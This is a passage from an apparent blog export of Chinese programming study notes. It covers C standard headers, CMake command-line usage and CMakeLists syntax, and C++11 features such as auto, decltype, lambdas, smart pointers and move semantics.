<h2 id="参考库"><a href="#参考库" class="headerlink" title="参考库"></a>参考库</h2><p>assert.h: <code>assert(ignore) ((void)0)</code> 宏定义<br>ctype.h: 测试数据类型<br>errno.h: C 标准库中的特定函数修改它的值为一些非零值以表示某些类型的错误<br>float.h: 包含了一组与浮点值相关的依赖于平台的常量<br>limits.h: 决定了各种变量类型的各种属性<br>locale.h: 定义了特定地域的设置，比如日期格式和货币符号<br>math.h: 各种数学函数<br>setjmp.h: 定义了宏 setjmp()、函数 longjmp() 和变量类型 jmp_buf，该变量类型会绕过正常的函数调用和返回规则<br>signal.h: 定义了一个变量类型 sig_atomic_t、两个函数调用和一些宏来处理程序执行期间报告的不同信号<br>stdarg.h: 定义了一个变量类型 va_list 和三个宏，这三个宏可用于在参数个数可变时获取函数中的参数<br>stddef.h: 定义了各种变量类型和宏ptrdiff_t, size_t, wchar_t, NULL, offsetof<br>stdlib.h: size_t wchar_t NULL atof atoi atol strtod strtol等, malloc free, abort, exit, qsort, bsearch, system, abs, rand …<br>string.h: memcpy memmove memcmp memchr 以及字符串相关<br>time.h: struct tm, asctime, time, …</p>
]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>CMake</title>
    <url>/2020/04/07/C/CMake/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>
<h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><h2 id="CMake"><a href="#CMake" class="headerlink" title="CMake"></a>CMake</h2><p><a href="https://cmake.org/cmake/help/v3.18/">官方文档</a></p>
<p>CMake是一款跨平台编译系统生成器。例如可在<code>Linux</code>上生成<code>Makefile</code>，在<code>Windows</code>上生成<code>Visual Studio</code>工程等。目前也支持<code>Ninja</code>和<code>Xcode</code>。<br>CMake通常用于C&#x2F;C++文件的编译，同时也支持其他语言。</p>
<p>CMake提供三种工具：</p>
<ul>
<li>CMake 生成编译系统。</li>
<li>CTest 用于生成测试，反馈测试结果。</li>
<li>CPack 打包程序，用于产生安装文件。</li>
</ul>
<p>使用CMake需要有如下部分。<br>SourceTree 包含项目需要的Src文件。这个项目的编译系统和依赖项由CMake定义，CMake的入口文件为顶层的<code>CMakeLists.txt</code>文件。<br>BuildTree 包含项目生成的输出文件。CMake将生成一个<code>CMakeCache.txt</code>文件</p>
<p>CMake 命令行用法。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成编译系统</span></span><br><span class="line">cmake [&lt;options&gt;] &lt;path-to-source&gt;</span><br><span class="line">cmake [&lt;options&gt;] &lt;path-to-existing-build&gt;</span><br><span class="line">cmake [&lt;options&gt;] -S &lt;path-to-source&gt; -B &lt;path-to-build&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Build a Project</span></span><br><span class="line">cmake --build &lt;<span class="built_in">dir</span>&gt; [&lt;options&gt;] [-- &lt;build-tool-options&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install a Project</span></span><br><span class="line">cmake --install &lt;<span class="built_in">dir</span>&gt; [&lt;options&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Open a Project</span></span><br><span class="line">cmake --open &lt;<span class="built_in">dir</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run a Script</span></span><br><span class="line">cmake [&#123;-D &lt;var&gt;=&lt;value&gt;&#125;...] -P &lt;cmake-script-file&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run a Command-Line Tool</span></span><br><span class="line">cmake -E &lt;<span class="built_in">command</span>&gt; [&lt;options&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run the Find-Package Tool</span></span><br><span class="line">cmake --find-package [&lt;options&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># View Help</span></span><br><span class="line">cmake --<span class="built_in">help</span>[-&lt;topic&gt;]</span><br></pre></td></tr></table></figure>

<p><code>CMakeLists.txt</code>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置最低版本</span><br><span class="line">cmake_minimum_required(VERSION 3.4.1)</span><br><span class="line"></span><br><span class="line"># 打印信息</span><br><span class="line">MESSAGE(STATUS, &quot;Content&quot;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 设置项目标题</span><br><span class="line">PROJECT(demo)</span><br><span class="line"></span><br><span class="line"># 设置头文件路径</span><br><span class="line">INCLUDE_DIRECTORIES(</span><br><span class="line">    include</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 设置源文件路径</span><br><span class="line">AUX_SOURCE_DIRECTORY(src DIR_SRCS)</span><br><span class="line"></span><br><span class="line"># 设置环境变量</span><br><span class="line">SET(demo</span><br><span class="line">    $&#123;DIR_SRCS&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 添加依赖库</span><br><span class="line">TARGET_LINK_LIBRARIES($&#123;PROJECT_NAME&#125; m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 生成的文件</span><br><span class="line">add_executable(demo demo.cpp) # 生成可执行文件</span><br><span class="line">add_library(../bin/bin STATIC util.cpp) # 生成静态库</span><br><span class="line">add_library(../bin/bin SHARED util.cpp) # 生成动态库或共享库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="Make-Install"><a href="#Make-Install" class="headerlink" title="Make Install"></a>Make Install</h2><p>.&#x2F;configure、make、make install 命令<br>1、.&#x2F;configure 是用来检测你的安装平台的目标特征的。比如它会检测你是不是有CC或GCC，并不是需要CC或GCC，它是个shell脚本。<br>2、make 是用来编译的，它从Makefile中读取指令，然后编译。<br>3、make install是用来安装的，它也从Makefile中读取指令，安装到指定的位置。</p>
]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>CMake</tag>
        <tag>Makefile</tag>
      </tags>
  </entry>
  <entry>
    <title>C++</title>
    <url>/2020/04/07/C/CPP/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>


<h2 id="C-官网"><a href="#C-官网" class="headerlink" title="C++ 官网"></a>C++ 官网</h2><p><a href="http://www.cplusplus.com/reference/">C++官方参考手册1</a><br><a href="http://www.cppreference.com/">C++官方参考手册2</a><br><a href="https://gcc.gnu.org/">GNU官方参考手册</a></p>
<h2 id="C-编译"><a href="#C-编译" class="headerlink" title="C++ 编译"></a>C++ 编译</h2><h3 id="编译环境判断"><a href="#编译环境判断" class="headerlink" title="编译环境判断"></a>编译环境判断</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C++0X</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __cplusplus 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GXX_EXPERIMENTAL_CXX0X__ 1</span></span><br><span class="line"><span class="comment">// C++11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __cplusplus 201103L</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GXX_EXPERIMENTAL_CXX0X__ 1</span></span><br><span class="line"><span class="comment">// C++14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __cplusplus 201402L</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GXX_EXPERIMENTAL_CXX0X__ 1</span></span><br><span class="line"><span class="comment">// C++17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __cplusplus 201703L</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GXX_EXPERIMENTAL_CXX0X__ 1</span></span><br></pre></td></tr></table></figure>

<h2 id="调用C语言代码"><a href="#调用C语言代码" class="headerlink" title="调用C语言代码"></a>调用C语言代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123; <span class="comment">/* C代码 */</span> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><h2 id="数据抽象和封装"><a href="#数据抽象和封装" class="headerlink" title="数据抽象和封装"></a>数据抽象和封装</h2><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><h2 id="文件和流"><a href="#文件和流" class="headerlink" title="文件和流"></a>文件和流</h2><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><h2 id="动态内存"><a href="#动态内存" class="headerlink" title="动态内存"></a>动态内存</h2><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><h2 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h2><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h2 id="C-历史"><a href="#C-历史" class="headerlink" title="C++ 历史"></a>C++ 历史</h2><p>从开始有：C++98，C++03，C++TR1，C++14，C++ 扩展，C++17，C++20。</p>
<p>C++98是C++标准第一版，C++03是第二版，与C++98几乎一样，没做什么修改。</p>
<h3 id="C-11"><a href="#C-11" class="headerlink" title="C++11"></a>C++11</h3><p>新增<code>nullptr</code>来表示空指针。</p>
<p>auto 类型：</p>
<p>在C++11中，<code>auto</code>被赋予了新的含义，即自动推导出变量类型。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">auto</span> name = <span class="string">&quot;John&quot;</span>;</span><br><span class="line"><span class="keyword">auto</span> age = <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<p>这里，<code>auto</code>仅仅是一个占位符，在编译器期间它会被真正的类型所替代。或者说，C++ 中的变量必须是有明确类型的，只是这个类型是由编译器自己推导出来的。</p>
<p><code>auto</code>常用于定义迭代器，泛型编程等。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 迭代器</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vector&lt; vector&lt;<span class="type">int</span>&gt; &gt; v;</span><br><span class="line">    <span class="keyword">auto</span> i = v.<span class="built_in">begin</span>();  <span class="comment">//使用 auto 代替具体的类型</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 泛型</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> val = T::<span class="built_in">get</span>();</span><br><span class="line">    cout &lt;&lt; val &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但<code>auto</code>的使用也是有限制的：</p>
<ul>
<li>不能用作函数的形参；</li>
<li>不能作用域类的非静态成员变量；</li>
<li>不能定义数组；</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">auto</span> str[] = url;  <span class="comment">//arr 为数组，所以不能使用 auto</span></span><br></pre></td></tr></table></figure>

<ul>
<li>不可作用于模板参数；</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123; &#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A&lt;<span class="keyword">auto</span>&gt; C2;  <span class="comment">//错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>decltype：</p>
<p><code>decltype</code>也是在编译使其进行自动类型推导的关键字，意为声明类型（declare type），用于某些<code>auto</code>无法使用的情况下。基本形式为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">decltype</span>(exp) varname;</span><br></pre></td></tr></table></figure>

<p><code>exp</code>是一个普通的表达式，其结果必须是有类型的，不可是<code>void</code>。该关键字可以通过<code>exp</code>的类型定义<code>varname</code>的类型。具体推导规则如下：</p>
<ul>
<li><code>exp</code>没有被<code>()</code>包裹，那么则返回<code>exp</code>的类型；</li>
<li><code>exp</code>被<code>()</code>包裹，或是一个左值，那么则返回<code>exp</code>的引用类型；</li>
</ul>
<p>二者的区别在于：</p>
<ul>
<li><code>decltype</code>会保留CV限定符（<code>const</code>&#x2F;<code>volatile</code>），<code>auto</code>会在表达式的类型是指针或引用时才保留CV限定符；</li>
<li><code>decltype</code>会保留引用类型，<code>auto</code>会抛弃引用类型；</li>
</ul>
<p>返回值类型后置：</p>
<p>这一语法可以将<code>decltype</code>与<code>auto</code>结合起来完成返回值类型的推导。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 例如 </span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> U&gt;</span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">add</span><span class="params">(T t, U u)</span> -&gt; <span class="title">decltype</span><span class="params">(t + u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> t + u;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 例如 </span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">func</span><span class="params">(T&amp; val)</span> -&gt; <span class="title">decltype</span><span class="params">(foo(val))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">foo</span>(val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>连续的右尖括号 &gt;&gt;</p>
<p>C++98&#x2F;03中不允许连续的<code>&gt;&gt;</code>，在C++11中可以。</p>
<p>begin和end<br>不必使用<code>x.begin()</code>，而是可以直接调用<code>begin</code>函数:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span>(<span class="built_in">begin</span>(v), <span class="built_in">end</span>(v));</span><br></pre></td></tr></table></figure>

<p>using 关键字</p>
<p>using覆盖了typedef的全部功能，并增添了一些新的特性，改善了对模板的支持。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 重定义unsigned int</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">uint_t</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="type">uint_t</span> = <span class="type">unsigned</span> <span class="type">int</span>;</span><br><span class="line"><span class="comment">// 重定义std::map</span></span><br><span class="line"><span class="keyword">typedef</span> std::map&lt;std::string, <span class="type">int</span>&gt; <span class="type">map_int_t</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="type">map_int_t</span> = std::map&lt;std::string, <span class="type">int</span>&gt;;</span><br><span class="line"><span class="comment">// 指针</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="type">func_t</span>)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">using</span> <span class="type">func_t</span> = <span class="built_in">void</span> (*)(<span class="type">int</span>, <span class="type">int</span>);</span><br></pre></td></tr></table></figure>

<p>模板默认参数</p>
<p>在C++98&#x2F;03中，类模板可以有默认的模板参数，但是函数却没有。在C++11中，函数也可以用默认模板参数了。<br>函数在使用默认模板参数时，可以像普通函数一样调用。但是类必须加上<code>&lt;&gt;</code>。<br>若要填充模板参数，则要遵循从右向左的方式填充。<br>模板参数也支持了变长。</p>
<p>元组：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">auto</span> p = <span class="built_in">make_pair</span>(<span class="number">1</span>, <span class="string">&quot;C++ 11&quot;</span>); </span><br><span class="line"><span class="keyword">auto</span> t2 = <span class="built_in">make_tuple</span>(<span class="number">1</span>, <span class="number">2.0</span>, <span class="string">&quot;C++ 11&quot;</span>, &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>&#125;); </span><br></pre></td></tr></table></figure>

<p>列表初始化</p>
<p>初始化的适用性大大增加了：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Foo</span>(<span class="type">int</span>) &#123;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">Foo</span>(<span class="type">const</span> Foo &amp;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Foo <span class="title">a1</span><span class="params">(<span class="number">123</span>)</span></span>;</span><br><span class="line">    Foo a2 = <span class="number">123</span>;</span><br><span class="line">    Foo a3 = &#123; <span class="number">123</span> &#125;;</span><br><span class="line">    Foo a4 &#123; <span class="number">123</span> &#125;;</span><br><span class="line">    <span class="type">int</span> a5 = &#123; <span class="number">3</span> &#125;;</span><br><span class="line">    <span class="type">int</span> a6 &#123; <span class="number">3</span> &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用在函数返回值上</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Foo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">Foo</span>(<span class="type">int</span>, <span class="type">double</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">Foo <span class="title">func</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="number">123</span>, <span class="number">321.0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新的for循环</p>
<p>新的基于范围的for循环：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数组</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> n : arr) </span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; n &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// KV， val 类型是 std::pair</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span>&amp; val : mm)</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; val.first &lt;&lt; <span class="string">&quot; -&gt; &quot;</span> &lt;&lt; val.second &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>lambda</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">auto</span> f = [](<span class="type">int</span> a) -&gt; <span class="type">int</span> &#123; <span class="keyword">return</span> a + <span class="number">1</span>; &#125;;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">f</span>(<span class="number">1</span>) &lt;&lt; std::endl;  <span class="comment">// 输出: 2</span></span><br><span class="line"><span class="comment">// 也可以省略返回值类型</span></span><br><span class="line"><span class="keyword">auto</span> f = [](<span class="type">int</span> a) &#123; <span class="keyword">return</span> a + <span class="number">1</span>; &#125;;</span><br><span class="line"><span class="keyword">auto</span> f = [] &#123; <span class="keyword">return</span> a + <span class="number">1</span>; &#125;;</span><br><span class="line"><span class="comment">// 捕捉一定范围内的变量</span></span><br><span class="line"><span class="keyword">auto</span> x2 = [=]&#123; <span class="keyword">return</span> i_ + x + y; &#125;;           <span class="comment">// OK，捕获所有外部变量</span></span><br><span class="line"><span class="keyword">auto</span> x3 = [&amp;]&#123; <span class="keyword">return</span> i_ + x + y; &#125;;           <span class="comment">// OK，捕获所有外部变量</span></span><br><span class="line"><span class="keyword">auto</span> x4 = [<span class="keyword">this</span>]&#123; <span class="keyword">return</span> i_; &#125;;                <span class="comment">// OK，捕获this指针</span></span><br><span class="line"><span class="keyword">auto</span> x5 = [<span class="keyword">this</span>]&#123; <span class="keyword">return</span> i_ + x + y; &#125;;        <span class="comment">// error，没有捕获x、y</span></span><br><span class="line"><span class="keyword">auto</span> x6 = [<span class="keyword">this</span>, x, y]&#123; <span class="keyword">return</span> i_ + x + y; &#125;;  <span class="comment">// OK，捕获this指针、x、y</span></span><br><span class="line"><span class="keyword">auto</span> x7 = [<span class="keyword">this</span>]&#123; <span class="keyword">return</span> i_++; &#125;;    </span><br><span class="line"><span class="comment">// 存储lambda表达式</span></span><br><span class="line">std::function&lt;<span class="type">int</span>(<span class="type">int</span>)&gt;  f1 = [](<span class="type">int</span> a)&#123; <span class="keyword">return</span> a; &#125;;</span><br><span class="line">std::function&lt;<span class="type">int</span>(<span class="type">void</span>)&gt; f2 = std::<span class="built_in">bind</span>([](<span class="type">int</span> a)&#123; <span class="keyword">return</span> a; &#125;, <span class="number">123</span>);</span><br></pre></td></tr></table></figure>

<p>非受限联合体 Union</p>
<p>过去C++98不允许联合体成员是非POD类型，但是只会取消了这种限制。<br>POD数据类型是：</p>
<ul>
<li>没有自定义的构造函数，析构函数，拷贝构造，移动构造。</li>
<li>没有虚函数和虚基类。</li>
<li>非静态成员必须是public。</li>
<li>类的第一个非静态成员类型与基类不同。</li>
<li>类或结构体继承时，派生类有非静态成员，且仅包含静态成员的基类；基类有非静态成员，而派生类没有非静态成员。</li>
<li>POD 类型不能包含非 POD 类型的数据。</li>
<li>所有兼容C语言的数据类型都是 POD 类型。<br>也就是说，能用 C 的 memcpy() 等函数进行操作的类、结构体就是 POD 类型的数据。</li>
</ul>
<p><a href="http://c.biancheng.net/view/3730.html">这里</a></p>
<p>智能指针<code>&lt;memory&gt;</code>：<br>这里包含了三种智能指针: shared_ptr unique_ptr weak_ptr。智能指针是个模板类，可以指定类型，传入指针通过构造函数初始化。也可以使用make_shared函数初始化。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 多个指针指向相同的对象</span></span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; ptra = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(a);</span><br><span class="line"><span class="function">std::shared_ptr&lt;<span class="type">int</span>&gt; <span class="title">ptra2</span><span class="params">(ptra)</span></span>; <span class="comment">//copy</span></span><br><span class="line"><span class="comment">// 操作</span></span><br><span class="line"><span class="built_in">get</span>()  <span class="comment">// 获取原始指针</span></span><br><span class="line"><span class="built_in">use_count</span>()  <span class="comment">// 引用计数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 唯一拥有其所指对象</span></span><br><span class="line"><span class="comment">// 超出作用域后自动释放内存，不能拷贝和赋值</span></span><br><span class="line"><span class="function">std::unique_ptr&lt;<span class="type">int</span>&gt; <span class="title">uptr</span><span class="params">(<span class="keyword">new</span> <span class="type">int</span>(<span class="number">10</span>))</span></span>;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; uptr2 = std::<span class="built_in">move</span>(uptr); <span class="comment">// 转换所有权</span></span><br><span class="line">uptr2.<span class="built_in">release</span>(); <span class="comment">//释放所有权</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 协助shared_ptr工作，像旁观者那样观测资源的使用情况。</span></span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sh_ptr = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">10</span>);</span><br><span class="line"><span class="function">std::weak_ptr&lt;<span class="type">int</span>&gt; <span class="title">wp</span><span class="params">(sh_ptr)</span></span>;</span><br><span class="line"><span class="comment">// 操作</span></span><br><span class="line"><span class="built_in">expired</span>()  <span class="comment">// 等价于use_count()==0</span></span><br><span class="line"><span class="built_in">lock</span>()  <span class="comment">// 获得一个可用的shared_ptr对象， 从而操作资源</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环引用</span></span><br><span class="line"><span class="comment">// 为了避免循环引用，应该把其中一个指针设置为weak_ptr</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::weak_ptr&lt;Child&gt; ChildPtr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::shared_ptr&lt;Parent&gt; ParentPtr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>右值引用<br><a href="https://www.cnblogs.com/catch/p/3500678.html">左值右值</a>：左值指的是可以取地址的，有名字的，非临时的就是左值，右值指的则是不能取地址的，没有名字的，临时的就是右值。可见立即数，函数返回的值等都是右值；而非匿名对象(包括变量)，函数返回的引用，const对象等都是左值。</p>
<p>左值引用：左值引用要求右边的值必须能够取地址，如果无法取地址，可以用常引用。</p>
<p>右值引用：右值引用用来绑定到右值，绑定到右值以后本来会被销毁的右值的生存期会延长至与绑定到它的右值引用的生存期。右值引用可以进行读写操作，而常引用只能进行读操作。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> &amp;&amp;var = <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<p>Move&#x2F;<code>&amp;&amp;</code></p>
<p>通过move构造和move赋值可以避免内存重新分配。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// move constructor</span></span><br><span class="line"><span class="built_in">ArrayWrapper</span> (ArrayWrapper&amp;&amp; other)</span><br><span class="line">    : _p_vals( other._p_vals  )</span><br><span class="line">    , _size( other._size )</span><br><span class="line">&#123;</span><br><span class="line">    other._p_vals = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy constructor</span></span><br><span class="line"><span class="built_in">ArrayWrapper</span> (<span class="type">const</span> ArrayWrapper&amp; other)</span><br><span class="line">    : _p_vals( <span class="keyword">new</span> <span class="type">int</span>[ other._size  ] )</span><br><span class="line">    , _size( other._size )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span>; i &lt; _size; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        _p_vals[ i ] = other._p_vals[ i ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Bind: 可以把一个参数较多的函数给封装成参数较少的函数，重排源函数的参数顺序等</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">auto</span> newFun = <span class="built_in">bind</span>(oldFun,arg_list);</span><br><span class="line"><span class="keyword">auto</span> new_check_size = <span class="built_in">bind</span>(check_size,std::placeholders::_1,n);</span><br><span class="line"><span class="keyword">auto</span> newFun = <span class="built_in">bind</span>(old_Fun,_2,_1);</span><br></pre></td></tr></table></figure>

<h3 id="C-14"><a href="#C-14" class="headerlink" title="C++14"></a>C++14</h3><p>C++ 14 是 C++ 11 的增量更新，主要是支持普通函数的返回类型推演，泛型 lambda，扩展的 lambda 捕获，对 constexpr 函数限制的修订，constexpr变量模板化等等。</p>
<h3 id="C-17"><a href="#C-17" class="headerlink" title="C++17"></a>C++17</h3><h3 id="C-20"><a href="#C-20" class="headerlink" title="C++20"></a>C++20</h3><h2 id="技术分层"><a href="#技术分层" class="headerlink" title="技术分层"></a>技术分层</h2><p>基础部分：</p>
<ul>
<li>C基础：数据结构，结构体，函数，递归等</li>
<li>数据结构：链表，栈，队列，树，二叉树，B树，图</li>
<li>系统编程：基本操作，Shell，进程通信</li>
</ul>
<p>进阶部分：接口的设计和封装，模块的划分。</p>
<ul>
<li>日志</li>
<li>配置文件</li>
<li>Linux&#x2F;Win下IPC库</li>
<li>Socket库</li>
<li>数据库统一访问</li>
</ul>
<p>高级部分：</p>
<ul>
<li>Win 项目案例</li>
<li>Linux 项目案例</li>
<li>Android&#x2F;IOS 案例</li>
</ul>
<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>algorithm内涉及到元素本身的操作无非是比大小。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C++ :: 全局函数 查找</span></span><br><span class="line"><span class="keyword">auto</span> p = ::<span class="built_in">find</span>(c.<span class="built_in">begin</span>(), c.<span class="built_in">end</span>(), target);</span><br><span class="line"><span class="keyword">if</span>(p!=c.<span class="built_in">end</span>())&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C++ 排序</span></span><br><span class="line">::<span class="built_in">sort</span>(c.<span class="built_in">begin</span>(), c.<span class="built_in">end</span>()); <span class="comment">// 使用 RandomAccess 迭代器，因此不可用于链表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 比较</span></span><br><span class="line">::<span class="built_in">max</span>(a, b);</span><br><span class="line">::<span class="built_in">min</span>(a, b);</span><br><span class="line">::<span class="built_in">max</span>(a, b, comp);  <span class="comment">// comp(a, b)</span></span><br><span class="line">::<span class="built_in">min</span>(a, b, comp);</span><br></pre></td></tr></table></figure>

